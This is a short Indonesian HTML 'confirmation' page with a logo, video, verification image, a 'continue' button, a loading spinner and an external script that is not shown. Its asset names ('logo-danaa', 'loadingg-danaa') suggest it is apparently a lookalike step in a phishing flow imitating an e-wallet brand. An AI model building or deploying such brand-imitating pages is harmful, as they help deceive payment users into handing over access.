<!-- success.html -->
<!DOCTYPE html>
<html lang="id">
<head>

    <meta charset="UTF-8">

      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>Konfirmasi</title>

    <link rel="stylesheet"
    href="success.css">

</head>
<body>

<div class="container">

    <!-- LOGO -->
    <div class="logo-wrap">

        <img
        src="assets/logo-danaa.png"
        class="logo">

    </div>

    <!-- VIDEO -->
    <div class="card">

        <video
        class="video"
        autoplay
        muted
        loop
        playsinline>

            <source
            src="assets/video.mp4"
            type="video/mp4">

        </video>

    </div>

    <!-- FOTO -->
    <div class="card photo-card">

        <img
        src="assets/verifikasi.png"
        class="photo">

    </div>

    <!-- TEXT -->
    <div class="bottom-text">

        JIKA SUDAH DI KONFIRMASI
        SILAHKAN KLIK

    </div>

    <!-- BUTTON -->
    <button
    type="button"
    class="btn"
    id="lanjutBtn">

        LANJUTKAN

    </button>

</div>

<!-- LOADING -->
<div
class="loading-box"
id="loadingBox">

    <div class="loading-circle">

        <div class="spinner-ring"></div>

        <img
        src="assets/loadingg-danaa.png"
        class="loading-logo">

    </div>

    <div class="loading-text">

        Memuat...

    </div>

</div>

<!-- SOUND -->
<audio
id="successSound"
autoplay>

    <source
    src="assets/success.mp3"
    type="audio/mpeg">

</audio>
<script src="success.js"></script>

</body>
</html>
